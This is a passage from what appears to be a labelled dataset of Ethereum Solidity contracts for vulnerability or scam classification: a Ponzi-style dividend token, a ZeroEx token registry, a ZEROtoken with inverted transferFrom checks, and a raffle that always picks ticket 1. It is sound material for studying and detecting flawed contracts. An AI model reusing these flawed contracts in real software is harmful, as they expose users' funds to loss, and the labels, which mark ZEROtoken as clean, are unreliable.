payoutDiff = (int256) ((earningsPerToken * numTokens) - buyerFee);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Then we update the payouts array for the buyer with this amount...\r\r\n\r\r\n\t\tpayouts[sender] += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ And then we finally add it to the variable tracking the total amount spent to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts    += payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Sell function that takes tokens and converts them into Ether. Also comes with a 10% fee\r\r\n\r\r\n\t\/\/ to discouraging dumping, and means that if someone near the top sells, the fee distributed\r\r\n\r\r\n\t\/\/ will be *significant*.\r\r\n\r\r\n\tfunction sell(uint256 amount) internal {\r\r\n\r\r\n\t    \/\/ Calculate the amount of Ether that the holders tokens sell for at the current sell price.\r\r\n\r\r\n\t\tvar numEthersBeforeFee = getEtherForTokens(amount);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ 10% of the resulting Ether is used to pay remaining holders.\r\r\n\r\r\n        var fee = div(numEthersBeforeFee, 10);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Net Ether for the seller after the fee has been subtracted.\r\r\n\r\r\n        var numEthers = numEthersBeforeFee - fee;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ *Remove* the numTokens which were just sold from the total supply. We're \/definitely\/ a crypto central bank.\r\r\n\r\r\n\t\ttotalSupply = sub(totalSupply, amount);\r\r\n\r\r\n\t\t\r\r\n\r\r\n        \/\/ Remove the tokens from the balance of the buyer.\r\r\n\r\r\n\t\ttokenBalance[msg.sender] = sub(tokenBalance[msg.sender], amount);\r\r\n\r\r\n\r\r\n\r\r\n        \/\/ Update the payout array so that the seller cannot claim future dividends unless they buy back in.\r\r\n\r\r\n\t\t\/\/ First we compute how much was just paid out to the seller...\r\r\n\r\r\n\t\tvar payoutDiff = (int256) (earningsPerToken * amount + (numEthers * scaleFactor));\r\r\n\r\r\n\t\t\r\r\n\r\r\n        \/\/ We reduce the amount paid out to the seller (this effectively resets their payouts value to zero,\r\r\n\r\r\n\t\t\/\/ since they're selling all of their tokens). This makes sure the seller isn't disadvantaged if\r\r\n\r\r\n\t\t\/\/ they decide to buy back in.\r\r\n\r\r\n\t\tpayouts[msg.sender] -= payoutDiff;\t\t\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Decrease the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n        totalPayouts -= payoutDiff;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Check that we have tokens in existence (this is a bit of an irrelevant check since we're\r\r\n\r\r\n\t\t\/\/ selling tokens, but it guards against division by zero).\r\r\n\r\r\n\t\tif (totalSupply > 0) {\r\r\n\r\r\n\t\t\t\/\/ Scale the Ether taken as the selling fee by the scaleFactor variable.\r\r\n\r\r\n\t\t\tvar etherFee = fee * scaleFactor;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ Fee is distributed to all remaining token holders.\r\r\n\r\r\n\t\t\t\/\/ rewardPerShare is the amount gained per token thanks to this sell.\r\r\n\r\r\n\t\t\tvar rewardPerShare = etherFee \/ totalSupply;\r\r\n\r\r\n\t\t\t\r\r\n\r\r\n\t\t\t\/\/ The Ether value per token is increased proportionally.\r\r\n\r\r\n\t\t\tearningsPerToken = add(earningsPerToken, rewardPerShare);\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t}\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ Dynamic value of Ether in reserve, according to the CRR requirement.\r\r\n\r\r\n\tfunction reserve() internal constant returns (uint256 amount) {\r\r\n\r\r\n\t\treturn sub(balance(),\r\r\n\r\r\n\t\t\t ((uint256) ((int256) (earningsPerToken * totalSupply) - totalPayouts) \/ scaleFactor));\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Calculates the number of tokens that can be bought for a given amount of Ether, according to the\r\r\n\r\r\n\t\/\/ dynamic reserve and totalSupply values (derived from the buy and sell prices).\r\r\n\r\r\n\tfunction getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {\r\r\n\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Semantically similar to getTokensForEther, but subtracts the callers balance from the amount of Ether returned for conversion.\r\r\n\r\r\n\tfunction calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {\r\r\n\r\r\n\t\treturn sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n\/crr_d + price_coeff), totalSupply);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Converts a number tokens into an Ether value.\r\r\n\r\r\n\tfunction getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {\r\r\n\r\r\n\t\t\/\/ How much reserve Ether do we have left in the contract?\r\r\n\r\r\n\t\tvar reserveAmount = reserve();\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ If you're the Highlander (or bagholder), you get The Prize. Everything left in the vault.\r\r\n\r\r\n\t\tif (tokens == totalSupply)\r\r\n\r\r\n\t\t\treturn reserveAmount;\r\r\n\r\r\n\r\r\n\r\r\n\t\t\/\/ If there would be excess Ether left after the transaction this is called within, return the Ether\r\r\n\r\r\n\t\t\/\/ corresponding to the equation in Dr Jochen Hoenicke's original Ponzi paper, which can be found\r\r\n\r\r\n\t\t\/\/ at https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/ in the third equation, with the CRR numerator \r\r\n\r\r\n\t\t\/\/ and denominator altered to 1 and 2 respectively.\r\r\n\r\r\n\t\treturn sub(reserveAmount, fixedExp((fixedLog(totalSupply - tokens) - price_coeff) * crr_d\/crr_n));\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ You don't care about these, but if you really do they're hex values for \r\r\n\r\r\n\t\/\/ co-efficients used to simulate approximations of the log and exp functions.\r\r\n\r\r\n\tint256  constant one        = 0x10000000000000000;\r\r\n\r\r\n\tuint256 constant sqrt2      = 0x16a09e667f3bcc908;\r\r\n\r\r\n\tuint256 constant sqrtdot5   = 0x0b504f333f9de6484;\r\r\n\r\r\n\tint256  constant ln2        = 0x0b17217f7d1cf79ac;\r\r\n\r\r\n\tint256  constant ln2_64dot5 = 0x2cb53f09f05cc627c8;\r\r\n\r\r\n\tint256  constant c1         = 0x1ffffffffff9dac9b;\r\r\n\r\r\n\tint256  constant c3         = 0x0aaaaaaac16877908;\r\r\n\r\r\n\tint256  constant c5         = 0x0666664e5e9fa0c99;\r\r\n\r\r\n\tint256  constant c7         = 0x049254026a7630acf;\r\r\n\r\r\n\tint256  constant c9         = 0x038bd75ed37753d68;\r\r\n\r\r\n\tint256  constant c11        = 0x03284a0c14610924f;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The polynomial R = c1*x + c3*x^3 + ... + c11 * x^11\r\r\n\r\r\n\t\/\/ approximates the function log(1+x)-log(1-x)\r\r\n\r\r\n\t\/\/ Hence R(s) = log((1+s)\/(1-s)) = log(a)\r\r\n\r\r\n\tfunction fixedLog(uint256 a) internal pure returns (int256 log) {\r\r\n\r\r\n\t\tint32 scale = 0;\r\r\n\r\r\n\t\twhile (a > sqrt2) {\r\r\n\r\r\n\t\t\ta \/= 2;\r\r\n\r\r\n\t\t\tscale++;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\twhile (a <= sqrtdot5) {\r\r\n\r\r\n\t\t\ta *= 2;\r\r\n\r\r\n\t\t\tscale--;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\tint256 s = (((int256)(a) - one) * one) \/ ((int256)(a) + one);\r\r\n\r\r\n\t\tvar z = (s*s) \/ one;\r\r\n\r\r\n\t\treturn scale * ln2 +\r\r\n\r\r\n\t\t\t(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11\/one))\r\r\n\r\r\n\t\t\t\t\/one))\/one))\/one))\/one))\/one);\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tint256 constant c2 =  0x02aaaaaaaaa015db0;\r\r\n\r\r\n\tint256 constant c4 = -0x000b60b60808399d1;\r\r\n\r\r\n\tint256 constant c6 =  0x0000455956bccdd06;\r\r\n\r\r\n\tint256 constant c8 = -0x000001b893ad04b3a;\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ The polynomial R = 2 + c2*x^2 + c4*x^4 + ...\r\r\n\r\r\n\t\/\/ approximates the function x*(exp(x)+1)\/(exp(x)-1)\r\r\n\r\r\n\t\/\/ Hence exp(x) = (R(x)+x)\/(R(x)-x)\r\r\n\r\r\n\tfunction fixedExp(int256 a) internal pure returns (uint256 exp) {\r\r\n\r\r\n\t\tint256 scale = (a + (ln2_64dot5)) \/ ln2 - 64;\r\r\n\r\r\n\t\ta -= scale*ln2;\r\r\n\r\r\n\t\tint256 z = (a*a) \/ one;\r\r\n\r\r\n\t\tint256 R = ((int256)(2) * one) +\r\r\n\r\r\n\t\t\t(z*(c2 + (z*(c4 + (z*(c6 + (z*c8\/one))\/one))\/one))\/one);\r\r\n\r\r\n\t\texp = (uint256) (((R + a) * one) \/ (R - a));\r\r\n\r\r\n\t\tif (scale >= 0)\r\r\n\r\r\n\t\t\texp <<= scale;\r\r\n\r\r\n\t\telse\r\r\n\r\r\n\t\t\texp >>= -scale;\r\r\n\r\r\n\t\treturn exp;\r\r\n\r\r\n\t}\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ The below are safemath implementations of the four arithmetic operators\r\r\n\r\r\n\t\/\/ designed to explicitly prevent over- and under-flows of integer values.\r\r\n\r\r\n\r\r\n\r\r\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tif (a == 0) {\r\r\n\r\r\n\t\t\treturn 0;\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t\tuint256 c = a * b;\r\r\n\r\r\n\t\tassert(c \/ a == b);\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\t\/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n\r\r\n\t\tuint256 c = a \/ b;\r\r\n\r\r\n\t\t\/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn't hold\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tassert(b <= a);\r\r\n\r\r\n\t\treturn a - b;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\r\r\n\r\r\n\t\tuint256 c = a + b;\r\r\n\r\r\n\t\tassert(c >= a);\r\r\n\r\r\n\t\treturn c;\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ This allows you to buy tokens by sending Ether directly to the smart contract\r\r\n\r\r\n\t\/\/ without including any transaction data (useful for, say, mobile wallet apps).\r\r\n\r\r\n\tfunction () payable public {\r\r\n\r\r\n\t\t\/\/ msg.value is the amount of Ether sent by the transaction.\r\r\n\r\r\n\t\tif (msg.value > 0) {\r\r\n\r\r\n\t\t\tfund();\r\r\n\r\r\n\t\t} else {\r\r\n\r\r\n\t\t\twithdrawOld(msg.sender);\r\r\n\r\r\n\t\t}\r\r\n\r\r\n\t}\r\r\n\r\r\n}","label":1}
{"code":"\/*\r\r\n\r\r\n  Copyright 2017 ZeroEx Intl.\r\r\n\r\r\n  Licensed under the Apache License, Version 2.0 (the \"License\");\r\r\n  you may not use this file except in compliance with the License.\r\r\n  You may obtain a copy of the License at\r\r\n\r\r\n    http:\/\/www.apache.org\/licenses\/LICENSE-2.0\r\r\n\r\r\n  Unless required by applicable law or agreed to in writing, software\r\r\n  distributed under the License is distributed on an \"AS IS\" BASIS,\r\r\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\r\n  See the License for the specific language governing permissions and\r\r\n  limitations under the License.\r\r\n\r\r\n*\/\r\r\n\r\r\npragma solidity 0.4.11;\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n    address public owner;\r\r\n\r\r\n    function Ownable() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) onlyOwner {\r\r\n        if (newOwner != address(0)) {\r\r\n            owner = newOwner;\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/\/ @title Token Registry - Stores metadata associated with ERC20 tokens. See ERC22 https:\/\/github.com\/ethereum\/EIPs\/issues\/22\r\r\n\/\/\/ @author Amir Bandeali - <<a href=\"\/cdn-cgi\/l\/email-protection\" class=\"__cf_email__\" data-cfemail=\"0b6a6662794b3b735b7964616e687f25686466\">[email&#160;protected]<\/a>>, Will Warren - <<a href=\"\/cdn-cgi\/l\/email-protection\" class=\"__cf_email__\" data-cfemail=\"9cebf5f0f0dcace4cceef3f6f9ffe8b2fff3f1\">[email&#160;protected]<\/a>>\r\r\ncontract TokenRegistry is Ownable {\r\r\n\r\r\n    event LogAddToken(\r\r\n        address indexed token,\r\r\n        string name,\r\r\n        string symbol,\r\r\n        uint8 decimals,\r\r\n        bytes ipfsHash,\r\r\n        bytes swarmHash\r\r\n    );\r\r\n\r\r\n    event LogRemoveToken(\r\r\n        address indexed token,\r\r\n        string name,\r\r\n        string symbol,\r\r\n        uint8 decimals,\r\r\n        bytes ipfsHash,\r\r\n        bytes swarmHash\r\r\n    );\r\r\n\r\r\n    event LogTokenNameChange(address indexed token, string oldName, string newName);\r\r\n    event LogTokenSymbolChange(address indexed token, string oldSymbol, string newSymbol);\r\r\n    event LogTokenIpfsHashChange(address indexed token, bytes oldIpfsHash, bytes newIpfsHash);\r\r\n    event LogTokenSwarmHashChange(address indexed token, bytes oldSwarmHash, bytes newSwarmHash);\r\r\n\r\r\n    mapping (address => TokenMetadata) public tokens;\r\r\n    mapping (string => address) tokenBySymbol;\r\r\n    mapping (string => address) tokenByName;\r\r\n\r\r\n    address[] public tokenAddresses;\r\r\n\r\r\n    struct TokenMetadata {\r\r\n        address token;\r\r\n        string name;\r\r\n        string symbol;\r\r\n        uint8 decimals;\r\r\n        bytes ipfsHash;\r\r\n        bytes swarmHash;\r\r\n    }\r\r\n\r\r\n    modifier tokenExists(address _token) {\r\r\n        require(tokens[_token].token != address(0));\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier tokenDoesNotExist(address _token) {\r\r\n        require(tokens[_token].token == address(0));\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier nameDoesNotExist(string _name) {\r\r\n      require(tokenByName[_name] == address(0));\r\r\n      _;\r\r\n    }\r\r\n\r\r\n    modifier symbolDoesNotExist(string _symbol) {\r\r\n        require(tokenBySymbol[_symbol] == address(0));\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier addressNotNull(address _address) {\r\r\n        require(_address != address(0));\r\r\n        _;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/\/ @dev Allows owner to add a new token to the registry.\r\r\n    \/\/\/ @param _token Address of new token.\r\r\n    \/\/\/ @param _name Name of new token.\r\r\n    \/\/\/ @param _symbol Symbol for new token.\r\r\n    \/\/\/ @param _decimals Number of decimals, divisibility of new token.\r\r\n    \/\/\/ @param _ipfsHash IPFS hash of token icon.\r\r\n    \/\/\/ @param _swarmHash Swarm hash of token icon.\r\r\n    function addToken(\r\r\n        address _token,\r\r\n        string _name,\r\r\n        string _symbol,\r\r\n        uint8 _decimals,\r\r\n        bytes _ipfsHash,\r\r\n        bytes _swarmHash)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenDoesNotExist(_token)\r\r\n        addressNotNull(_token)\r\r\n        symbolDoesNotExist(_symbol)\r\r\n        nameDoesNotExist(_name)\r\r\n    {\r\r\n        tokens[_token] = TokenMetadata({\r\r\n            token: _token,\r\r\n            name: _name,\r\r\n            symbol: _symbol,\r\r\n            decimals: _decimals,\r\r\n            ipfsHash: _ipfsHash,\r\r\n            swarmHash: _swarmHash\r\r\n        });\r\r\n        tokenAddresses.push(_token);\r\r\n        tokenBySymbol[_symbol] = _token;\r\r\n        tokenByName[_name] = _token;\r\r\n        LogAddToken(\r\r\n            _token,\r\r\n            _name,\r\r\n            _symbol,\r\r\n            _decimals,\r\r\n            _ipfsHash,\r\r\n            _swarmHash\r\r\n        );\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows owner to remove an existing token from the registry.\r\r\n    \/\/\/ @param _token Address of existing token.\r\r\n    function removeToken(address _token, uint _index)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenExists(_token)\r\r\n    {\r\r\n        require(tokenAddresses[_index] == _token);\r\r\n\r\r\n        tokenAddresses[_index] = tokenAddresses[tokenAddresses.length - 1];\r\r\n        tokenAddresses.length -= 1;\r\r\n\r\r\n        TokenMetadata storage token = tokens[_token];\r\r\n        LogRemoveToken(\r\r\n            token.token,\r\r\n            token.name,\r\r\n            token.symbol,\r\r\n            token.decimals,\r\r\n            token.ipfsHash,\r\r\n            token.swarmHash\r\r\n        );\r\r\n        delete tokenBySymbol[token.symbol];\r\r\n        delete tokenByName[token.name];\r\r\n        delete tokens[_token];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows owner to modify an existing token&#39;s name.\r\r\n    \/\/\/ @param _token Address of existing token.\r\r\n    \/\/\/ @param _name New name.\r\r\n    function setTokenName(address _token, string _name)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenExists(_token)\r\r\n        nameDoesNotExist(_name)\r\r\n    {\r\r\n        TokenMetadata storage token = tokens[_token];\r\r\n        LogTokenNameChange(_token, token.name, _name);\r\r\n        delete tokenByName[token.name];\r\r\n        tokenByName[_name] = _token;\r\r\n        token.name = _name;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows owner to modify an existing token&#39;s symbol.\r\r\n    \/\/\/ @param _token Address of existing token.\r\r\n    \/\/\/ @param _symbol New symbol.\r\r\n    function setTokenSymbol(address _token, string _symbol)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenExists(_token)\r\r\n        symbolDoesNotExist(_symbol)\r\r\n    {\r\r\n        TokenMetadata storage token = tokens[_token];\r\r\n        LogTokenSymbolChange(_token, token.symbol, _symbol);\r\r\n        delete tokenBySymbol[token.symbol];\r\r\n        tokenBySymbol[_symbol] = _token;\r\r\n        token.symbol = _symbol;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows owner to modify an existing token&#39;s IPFS hash.\r\r\n    \/\/\/ @param _token Address of existing token.\r\r\n    \/\/\/ @param _ipfsHash New IPFS hash.\r\r\n    function setTokenIpfsHash(address _token, bytes _ipfsHash)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenExists(_token)\r\r\n    {\r\r\n        TokenMetadata storage token = tokens[_token];\r\r\n        LogTokenIpfsHashChange(_token, token.ipfsHash, _ipfsHash);\r\r\n        token.ipfsHash = _ipfsHash;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows owner to modify an existing token&#39;s Swarm hash.\r\r\n    \/\/\/ @param _token Address of existing token.\r\r\n    \/\/\/ @param _swarmHash New Swarm hash.\r\r\n    function setTokenSwarmHash(address _token, bytes _swarmHash)\r\r\n        public\r\r\n        onlyOwner\r\r\n        tokenExists(_token)\r\r\n    {\r\r\n        TokenMetadata storage token = tokens[_token];\r\r\n        LogTokenSwarmHashChange(_token, token.swarmHash, _swarmHash);\r\r\n        token.swarmHash = _swarmHash;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Web3 call functions\r\r\n     *\/\r\r\n\r\r\n    \/\/\/ @dev Provides a registered token&#39;s address when given the token symbol.\r\r\n    \/\/\/ @param _symbol Symbol of registered token.\r\r\n    \/\/\/ @return Token&#39;s address.\r\r\n    function getTokenAddressBySymbol(string _symbol) constant returns (address) {\r\r\n        return tokenBySymbol[_symbol];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Provides a registered token&#39;s address when given the token name.\r\r\n    \/\/\/ @param _name Name of registered token.\r\r\n    \/\/\/ @return Token&#39;s address.\r\r\n    function getTokenAddressByName(string _name) constant returns (address) {\r\r\n        return tokenByName[_name];\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Provides a registered token&#39;s metadata, looked up by address.\r\r\n    \/\/\/ @param _token Address of registered token.\r\r\n    \/\/\/ @return Token metadata.\r\r\n    function getTokenMetaData(address _token)\r\r\n        public\r\r\n        constant\r\r\n        returns (\r\r\n            address,  \/\/tokenAddress\r\r\n            string,   \/\/name\r\r\n            string,   \/\/symbol\r\r\n            uint8,    \/\/decimals\r\r\n            bytes,    \/\/ipfsHash\r\r\n            bytes     \/\/swarmHash\r\r\n        )\r\r\n    {\r\r\n        TokenMetadata memory token = tokens[_token];\r\r\n        return (\r\r\n            token.token,\r\r\n            token.name,\r\r\n            token.symbol,\r\r\n            token.decimals,\r\r\n            token.ipfsHash,\r\r\n            token.swarmHash\r\r\n        );\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Provides a registered token&#39;s metadata, looked up by name.\r\r\n    \/\/\/ @param _name Name of registered token.\r\r\n    \/\/\/ @return Token metadata.\r\r\n    function getTokenByName(string _name)\r\r\n        public\r\r\n        constant\r\r\n        returns (\r\r\n            address,  \/\/tokenAddress\r\r\n            string,   \/\/name\r\r\n            string,   \/\/symbol\r\r\n            uint8,    \/\/decimals\r\r\n            bytes,    \/\/ipfsHash\r\r\n            bytes     \/\/swarmHash\r\r\n        )\r\r\n    {\r\r\n        address _token = tokenByName[_name];\r\r\n        return getTokenMetaData(_token);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Provides a registered token&#39;s metadata, looked up by symbol.\r\r\n    \/\/\/ @param _symbol Symbol of registered token.\r\r\n    \/\/\/ @return Token metadata.\r\r\n    function getTokenBySymbol(string _symbol)\r\r\n        public\r\r\n        constant\r\r\n        returns (\r\r\n            address,  \/\/tokenAddress\r\r\n            string,   \/\/name\r\r\n            string,   \/\/symbol\r\r\n            uint8,    \/\/decimals\r\r\n            bytes,    \/\/ipfsHash\r\r\n            bytes     \/\/swarmHash\r\r\n        )\r\r\n    {\r\r\n        address _token = tokenBySymbol[_symbol];\r\r\n        return getTokenMetaData(_token);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns an array containing all token addresses.\r\r\n    \/\/\/ @return Array of token addresses.\r\r\n    function getTokenAddresses()\r\r\n        public\r\r\n        constant\r\r\n        returns (address[])\r\r\n    {\r\r\n        return tokenAddresses;\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.12;\r\r\n\r\r\ncontract ForeignToken { function balanceOf(address _owner) constant returns (uint256); function transfer(address _to, uint256 _value) returns (bool); }\r\r\n\r\r\ncontract ZEROtoken { address owner = msg.sender;\r\r\n\r\r\n bool public purchasingAllowed = false;\r\r\n\r\r\n mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed;\r\r\n\r\r\n uint256 public totalContribution = 0;\r\r\n\r\r\n uint256 public totalSupply = 0;\r\r\n\r\r\n function name() constant returns (string) { return \"ZERO token\"; } function symbol() constant returns (string) { return \"ZERO\"; } function decimals() constant returns (uint8) { return 18; } function balanceOf(address _owner) constant returns (uint256) { return balances[_owner]; } function transfer(address _to, uint256 _value) returns (bool success) { if(msg.data.length < (2 * 32) + 4) { return; }\r\r\n\r\r\n if (_value == 0) { return false; }\r\r\n\r\r\n uint256 fromBalance = balances[msg.sender];\r\r\n\r\r\n bool sufficientFunds = fromBalance >= _value; bool overflowed = balances[_to] + _value < balances[_to]; if (sufficientFunds && !overflowed) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if(msg.data.length < (3 * 32) + 4) { return; }\r\r\n\r\r\n if (_value == 0) { return false; } uint256 fromBalance = balances[_from]; uint256 allowance = allowed[_from][msg.sender];\r\r\n\r\r\n bool sufficientFunds = fromBalance <= _value; bool sufficientAllowance = allowance <= _value; bool overflowed = balances[_to] + _value > balances[_to];\r\r\n\r\r\n if (sufficientFunds && sufficientAllowance && !overflowed) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function approve(address _spender, uint256 _value) returns (bool success) { if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; } allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256) { return allowed[_owner][_spender]; }\r\r\n\r\r\n event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\r\n\r\r\n function enablePurchasing() { if (msg.sender != owner) { return; }\r\r\n\r\r\n purchasingAllowed = true; }\r\r\n\r\r\n function disablePurchasing() { if (msg.sender != owner) { return; }\r\r\n\r\r\n purchasingAllowed = false; }\r\r\n\r\r\n function withdrawForeignTokens(address _tokenContract) returns (bool) { if (msg.sender != owner) { return; }\r\r\n\r\r\n ForeignToken token = ForeignToken(_tokenContract);\r\r\n\r\r\n uint256 amount = token.balanceOf(address(this)); return token.transfer(owner, amount); }\r\r\n\r\r\n function getStats() constant returns (uint256, uint256, bool) {\r\r\n\r\r\n return (totalContribution, totalSupply, purchasingAllowed);\r\r\n\r\r\n }\r\r\n\r\r\n function kill() { if (msg.sender == owner) suicide(owner); }\r\r\n\r\r\n function() payable { if (!purchasingAllowed) { if (msg.value > 0) { owner.transfer(msg.value); } return; } if (msg.value == 0) { return; }\r\r\n\r\r\n owner.transfer(msg.value); totalContribution += msg.value;\r\r\n\r\r\n uint256 tokensIssued = (msg.value * 10000); if (msg.value >= 10 finney) { tokensIssued += totalContribution;\r\r\n\r\r\n }\r\r\n\r\r\n totalSupply += tokensIssued; balances[msg.sender] += tokensIssued; Transfer(address(this), msg.sender, tokensIssued); } }","label":0}
{"code":"pragma solidity ^0.4.0;\r\r\n\r\r\ncontract Ethraffle {\r\r\n    \/\/ Structs\r\r\n    struct Contestant {\r\r\n        address addr;\r\r\n        uint raffleId;\r\r\n    }\r\r\n\r\r\n    \/\/ Constants\r\r\n    address public creatorAddress;\r\r\n    address constant public rakeAddress = 0x15887100f3b3cA0b645F007c6AA11348665c69e5;\r\r\n    uint constant public prize = 0.1 ether;\r\r\n    uint constant public rake = 0.02 ether;\r\r\n    uint constant public totalTickets = 6;\r\r\n    uint constant public pricePerTicket = (prize + rake) \/ totalTickets;\r\r\n\r\r\n    \/\/ Variables\r\r\n    uint public raffleId = 0;\r\r\n    uint public nextTicket = 0;\r\r\n    mapping (uint => Contestant) public contestants;\r\r\n    uint[] public gaps;\r\r\n\r\r\n    \/\/ Initialization\r\r\n    function Ethraffle() public {\r\r\n        creatorAddress = msg.sender;\r\r\n        resetRaffle();\r\r\n    }\r\r\n\r\r\n    function resetRaffle() private {\r\r\n        raffleId++;\r\r\n        nextTicket = 1;\r\r\n    }\r\r\n\r\r\n    \/\/ Call buyTickets() when receiving Ether outside a function\r\r\n    function () payable public {\r\r\n        buyTickets();\r\r\n    }\r\r\n\r\r\n    function buyTickets() payable public {\r\r\n        uint moneySent = msg.value;\r\r\n\r\r\n        while (moneySent >= pricePerTicket && nextTicket <= totalTickets) {\r\r\n            uint currTicket = 0;\r\r\n            if (gaps.length > 0) {\r\r\n                currTicket = gaps[gaps.length-1];\r\r\n                gaps.length--;\r\r\n            } else {\r\r\n                currTicket = nextTicket++;\r\r\n            }\r\r\n\r\r\n            contestants[currTicket] = Contestant(msg.sender, raffleId);\r\r\n            moneySent -= pricePerTicket;\r\r\n        }\r\r\n\r\r\n        \/\/ Choose winner if we sold all the tickets\r\r\n        if (nextTicket > totalTickets) {\r\r\n            chooseWinner();\r\r\n        }\r\r\n\r\r\n        \/\/ Send back leftover money\r\r\n        if (moneySent > 0) {\r\r\n            msg.sender.transfer(moneySent);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function chooseWinner() private {\r\r\n        uint winningTicket = 1; \/\/ TODO: Randomize\r\r\n        address winningAddress = contestants[winningTicket].addr;\r\r\n        resetRaffle();\r\r\n        winningAddress.transfer(prize);\r\r\n        rakeAddress.transfer(rake);\r\r\n    }\r\r\n\r\r\n    function getRefund() public {\r\r\n        uint refunds = 0;\r\r\n        for (uint i = 1; i <= totalTickets; i++) {\r\r\n            if (msg.sender == contestants[i].addr && raffleId == contestants[i].raffleId) {\r\r\n                refunds++;\r\r\n                contestants[i] = Contestant(address(0), 0);\r\r\n                gaps.push(i);\r\r\n            }\r\r\n        }\r\r\n\r\r\n        if (refunds > 0) {\r\r\n            msg.sender.transfer(refunds * pricePerTicket);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function kill() public {\r\r\n        if (msg.sender == creatorAddress) {\r\r\n            selfdestruct(creatorAddress);\r\r\n        